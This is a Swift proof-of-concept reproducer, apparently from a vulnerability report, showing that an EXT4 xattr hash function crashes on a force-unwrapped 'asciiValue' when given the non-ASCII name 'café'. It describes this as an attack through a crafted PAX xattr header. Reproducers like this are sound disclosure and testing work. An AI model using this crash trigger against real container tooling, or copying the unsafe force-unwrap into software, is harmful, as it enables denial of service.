// poc_reproduce.swift — minimal reproducer for CWE-476 in ContainerizationEXT4
// Extracted from: Sources/ContainerizationEXT4/EXT4+Xattrs.swift (line 57-79)
// Demonstrates: char.asciiValue! force-unwrap crash on non-ASCII xattr name

import Foundation

// --- Verbatim excerpt from EXT4+Xattrs.swift ---
func computeHash(name: String, value: [UInt8]) -> UInt32 {
    var hash: UInt32 = 0
    for char in name {
        // LINE 60 — THE VULNERABLE LINE:
        hash = (hash << 5) ^ (hash >> 27) ^ UInt32(char.asciiValue!)
    }
    var i = 0
    while i + 3 < value.count {
        let s = value[i..<i + 4]
        let v = s.withUnsafeBytes { $0.load(as: UInt32.self) }
        hash = (hash << 16) ^ (hash >> 16) ^ v
        i += 4
    }
    return hash
}
// --- End excerpt ---

// Explicitly verify asciiValue behavior first
// é = U+00E9 (Latin small letter e with acute) — NOT ASCII
let testChar: Character = "\u{00E9}"  // é — explicit Unicode escape
print("[+] Testing Character('\\u{00E9}').asciiValue = \(String(describing: testChar.asciiValue))")
print("[+] Expected: nil (é is not ASCII; asciiValue! will crash)")

// Attack: PAX xattr header with non-ASCII name user.café
// After prefix compression (index=1 maps "user."), compressedName = "caf\u{00E9}"
let xattrCompressedName = "caf\u{00E9}"  // é as explicit Unicode escape — cannot be mis-encoded
let xattrValue = Array(repeating: UInt8(0x41), count: 92) // 92 bytes → forces block storage

print("[+] xattr name (compressed): \(xattrCompressedName.debugDescription)")
print("[+] value size: \(xattrValue.count) bytes")
print("[+] Calling computeHash() — crash imminent on é character...")
fflush(stdout)  // ensure output is flushed before crash

let h = computeHash(name: xattrCompressedName, value: xattrValue)
// ↑ CRASH: Fatal error: Unexpectedly found nil while unwrapping an Optional value
print("[-] UNEXPECTED: hash = \(h) — crash did NOT occur")
